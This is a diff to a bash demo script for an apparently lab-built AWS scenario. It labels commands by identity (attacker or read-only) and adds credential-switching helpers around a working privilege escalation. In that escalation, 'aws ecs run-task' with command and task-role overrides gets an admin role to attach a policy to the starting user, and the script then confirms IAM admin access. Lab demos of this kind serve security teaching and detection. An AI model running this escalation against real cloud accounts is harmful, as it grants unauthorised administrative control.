@@ -24,12 +24,14 @@ ATTACK_COMMANDS=()
 
 # Display a command before executing it
 show_cmd() {
-    echo -e "${DIM}\$ $*${NC}"
+    local identity="$1"; shift
+    echo -e "${DIM}[${identity}] \$ $*${NC}"
 }
 
 # Display AND record an attack command
 show_attack_cmd() {
-    echo -e "\n${CYAN}\$ $*${NC}"
+    local identity="$1"; shift
+    echo -e "\n${CYAN}[${identity}] \$ $*${NC}"
     ATTACK_COMMANDS+=("$*")
 }
 
@@ -73,6 +75,15 @@ if [ "$STARTING_ACCESS_KEY_ID" == "null" ] || [ -z "$STARTING_ACCESS_KEY_ID" ]; 
     exit 1
 fi
 
+# Retrieve readonly credentials
+READONLY_ACCESS_KEY=$(terraform output -raw prod_readonly_user_access_key_id 2>/dev/null)
+READONLY_SECRET_KEY=$(terraform output -raw prod_readonly_user_secret_access_key 2>/dev/null)
+
+if [ -z "$READONLY_ACCESS_KEY" ] || [ "$READONLY_ACCESS_KEY" == "null" ]; then
+    echo -e "${RED}Error: Could not find readonly credentials in terraform output${NC}"
+    exit 1
+fi
+
 # Get region
 AWS_REGION=$(terraform output -raw aws_region 2>/dev/null || echo "")
 
@@ -92,17 +103,27 @@ echo -e "${GREEN}✓ Retrieved configuration from Terraform${NC}\n"
 # Navigate back to scenario directory
 cd - > /dev/null
 
+# Credential switching helpers
+use_starting_user_creds() {
+    export AWS_ACCESS_KEY_ID="$STARTING_ACCESS_KEY_ID"
+    export AWS_SECRET_ACCESS_KEY="$STARTING_SECRET_ACCESS_KEY"
+    unset AWS_SESSION_TOKEN
+}
+use_readonly_creds() {
+    export AWS_ACCESS_KEY_ID="$READONLY_ACCESS_KEY"
+    export AWS_SECRET_ACCESS_KEY="$READONLY_SECRET_KEY"
+    unset AWS_SESSION_TOKEN
+}
+
 # Step 2: Configure AWS credentials with starting user
 echo -e "${YELLOW}Step 2: Configuring AWS CLI with starting user credentials${NC}"
-export AWS_ACCESS_KEY_ID=$STARTING_ACCESS_KEY_ID
-export AWS_SECRET_ACCESS_KEY=$STARTING_SECRET_ACCESS_KEY
+use_starting_user_creds
 export AWS_REGION=$AWS_REGION
-unset AWS_SESSION_TOKEN
 
 echo "Using region: $AWS_REGION"
 
 # Verify starting user identity
-show_cmd "aws sts get-caller-identity --query 'Arn' --output text"
+show_cmd "Attacker" "aws sts get-caller-identity --query 'Arn' --output text"
 CURRENT_USER=$(aws sts get-caller-identity --query 'Arn' --output text)
 echo "Current identity: $CURRENT_USER"
 
@@ -114,7 +135,7 @@ echo -e "${GREEN}✓ Verified starting user identity${NC}\n"
 
 # Step 3: Get account ID
 echo -e "${YELLOW}Step 3: Getting account ID${NC}"
-show_cmd "aws sts get-caller-identity --query 'Account' --output text"
+show_cmd "Attacker" "aws sts get-caller-identity --query 'Account' --output text"
 ACCOUNT_ID=$(aws sts get-caller-identity --query 'Account' --output text)
 echo "Account ID: $ACCOUNT_ID"
 echo -e "${GREEN}✓ Retrieved account ID${NC}\n"
@@ -122,7 +143,7 @@ echo -e "${GREEN}✓ Retrieved account ID${NC}\n"
 # Step 4: Verify we don't have admin permissions yet
 echo -e "${YELLOW}Step 4: Verifying we don't have admin permissions yet${NC}"
 echo "Attempting to list IAM users (should fail)..."
-show_cmd "aws iam list-users --max-items 1"
+show_cmd "Attacker" "aws iam list-users --max-items 1"
 if aws iam list-users --max-items 1 &> /dev/null; then
     echo -e "${RED}Warning: Unexpectedly have admin permissions already${NC}"
 else
@@ -130,10 +151,12 @@ else
 fi
 echo ""
 
+# [OBSERVATION] Check current policies attached to starting user
 # Step 5: Check current policies attached to starting user
+use_readonly_creds
 echo -e "${YELLOW}Step 5: Checking current policies attached to starting user${NC}"
 echo "Listing attached policies for: $STARTING_USER"
-show_cmd "aws iam list-attached-user-policies --user-name $STARTING_USER --query 'AttachedPolicies[*].PolicyName' --output text"
+show_cmd "ReadOnly" "aws iam list-attached-user-policies --user-name $STARTING_USER --query 'AttachedPolicies[*].PolicyName' --output text"
 ATTACHED_POLICIES=$(aws iam list-attached-user-policies --user-name $STARTING_USER --query 'AttachedPolicies[*].PolicyName' --output text)
 if [ -z "$ATTACHED_POLICIES" ]; then
     echo "No managed policies currently attached"
@@ -142,10 +165,11 @@ else
 fi
 echo -e "${GREEN}✓ Verified current policy state${NC}\n"
 
+# [OBSERVATION] Discover existing task definitions in the cluster
 # Step 6: List existing task definitions to find the pre-deployed one
 echo -e "${YELLOW}Step 6: Discovering existing task definition${NC}"
 echo "Listing task definitions in family: $EXISTING_TASK_FAMILY"
-show_cmd "aws ecs list-task-definitions --region $AWS_REGION --family-prefix $EXISTING_TASK_FAMILY --status ACTIVE --query 'taskDefinitionArns[*]' --output text"
+show_cmd "ReadOnly" "aws ecs list-task-definitions --region $AWS_REGION --family-prefix $EXISTING_TASK_FAMILY --status ACTIVE --query 'taskDefinitionArns[*]' --output text"
 
 TASK_DEFS=$(aws ecs list-task-definitions \
     --region $AWS_REGION \
@@ -170,11 +194,12 @@ echo ""
 echo "Using task definition: $LATEST_TASK_DEF"
 echo -e "${GREEN}✓ Found existing task definition to override${NC}\n"
 
+# [OBSERVATION] Discover VPC and subnet configuration for ECS task
 # Step 7: Find network configuration for ECS task
 echo -e "${YELLOW}Step 7: Finding network configuration for ECS task${NC}"
 
 # Get default VPC
-show_cmd "aws ec2 describe-vpcs --region $AWS_REGION --filters 'Name=is-default,Values=true' --query 'Vpcs[0].VpcId' --output text"
+show_cmd "ReadOnly" "aws ec2 describe-vpcs --region $AWS_REGION --filters 'Name=is-default,Values=true' --query 'Vpcs[0].VpcId' --output text"
 DEFAULT_VPC=$(aws ec2 describe-vpcs \
     --region $AWS_REGION \
     --filters "Name=is-default,Values=true" \
@@ -190,7 +215,7 @@ fi
 echo "Default VPC: $DEFAULT_VPC"
 
 # Get a subnet from the default VPC
-show_cmd "aws ec2 describe-subnets --region $AWS_REGION --filters 'Name=vpc-id,Values=$DEFAULT_VPC' --query 'Subnets[0].SubnetId' --output text"
+show_cmd "ReadOnly" "aws ec2 describe-subnets --region $AWS_REGION --filters 'Name=vpc-id,Values=$DEFAULT_VPC' --query 'Subnets[0].SubnetId' --output text"
 DEFAULT_SUBNET=$(aws ec2 describe-subnets \
     --region $AWS_REGION \
     --filters "Name=vpc-id,Values=$DEFAULT_VPC" \
@@ -205,7 +230,9 @@ fi
 echo "Using Subnet: $DEFAULT_SUBNET"
 echo -e "${GREEN}✓ Network configuration identified${NC}\n"
 
+# [EXPLOIT] Run ECS task with overridden command and admin role
 # Step 8: Run the ECS task with overrides (the privilege escalation)
+use_starting_user_creds
 echo -e "${YELLOW}Step 8: Running ECS task with command and taskRoleArn overrides${NC}"
 echo -e "${RED}This is the privilege escalation vector!${NC}"
 echo ""
@@ -240,7 +267,7 @@ OVERRIDES=$(cat <<EOF
 EOF
 )
 
-show_attack_cmd "aws ecs run-task --region $AWS_REGION --cluster $CLUSTER_NAME --task-definition $EXISTING_TASK_FAMILY --launch-type FARGATE --network-configuration \"awsvpcConfiguration={subnets=[$DEFAULT_SUBNET],assignPublicIp=ENABLED}\" --overrides '$OVERRIDES'"
+show_attack_cmd "Attacker" "aws ecs run-task --region $AWS_REGION --cluster $CLUSTER_NAME --task-definition $EXISTING_TASK_FAMILY --launch-type FARGATE --network-configuration \"awsvpcConfiguration={subnets=[$DEFAULT_SUBNET],assignPublicIp=ENABLED}\" --overrides '$OVERRIDES'"
 RUN_TASK_RESULT=$(aws ecs run-task \
     --region $AWS_REGION \
     --cluster $CLUSTER_NAME \
@@ -263,7 +290,9 @@ fi
 echo "Task ARN: $TASK_ARN"
 echo -e "${GREEN}✓ Successfully started ECS task with overrides!${NC}\n"
 
+# [OBSERVATION] Poll task status until completion
 # Step 9: Wait for task to complete
+use_readonly_creds
 echo -e "${YELLOW}Step 9: Waiting for ECS task to complete${NC}"
 echo "Monitoring task status..."
 
@@ -275,7 +304,7 @@ while [ $ATTEMPT -lt $MAX_ATTEMPTS ]; do
     ATTEMPT=$((ATTEMPT + 1))
 
     # Get task status
-    show_cmd "aws ecs describe-tasks --region $AWS_REGION --cluster $CLUSTER_NAME --tasks $TASK_ARN --output json"
+    show_cmd "ReadOnly" "aws ecs describe-tasks --region $AWS_REGION --cluster $CLUSTER_NAME --tasks $TASK_ARN --output json"
     TASK_INFO=$(aws ecs describe-tasks \
         --region $AWS_REGION \
         --cluster $CLUSTER_NAME \
@@ -322,10 +351,11 @@ echo "IAM changes can take time to propagate across AWS infrastructure..."
 sleep 15
 echo -e "${GREEN}✓ IAM policy propagation complete${NC}\n"
 
+# [OBSERVATION] Verify policy was attached to starting user
 # Step 11: Verify policy was attached to starting user
 echo -e "${YELLOW}Step 11: Verifying policy attachment${NC}"
 echo "Checking attached policies for: $STARTING_USER"
-show_cmd "aws iam list-attached-user-policies --user-name $STARTING_USER --query 'AttachedPolicies[*].[PolicyName,PolicyArn]' --output text"
+show_cmd "ReadOnly" "aws iam list-attached-user-policies --user-name $STARTING_USER --query 'AttachedPolicies[*].[PolicyName,PolicyArn]' --output text"
 
 ATTACHED_POLICIES_AFTER=$(aws iam list-attached-user-policies \
     --user-name $STARTING_USER \
@@ -350,7 +380,7 @@ echo ""
 # Step 12: Verify admin access
 echo -e "${YELLOW}Step 12: Verifying administrator access${NC}"
 echo "Attempting to list IAM users..."
-show_cmd "aws iam list-users --max-items 3 --output table"
+show_cmd "Attacker" "aws iam list-users --max-items 3 --output table"
 
 if aws iam list-users --max-items 3 --output table; then
     echo -e "${GREEN}✓ Successfully listed IAM users!${NC}"
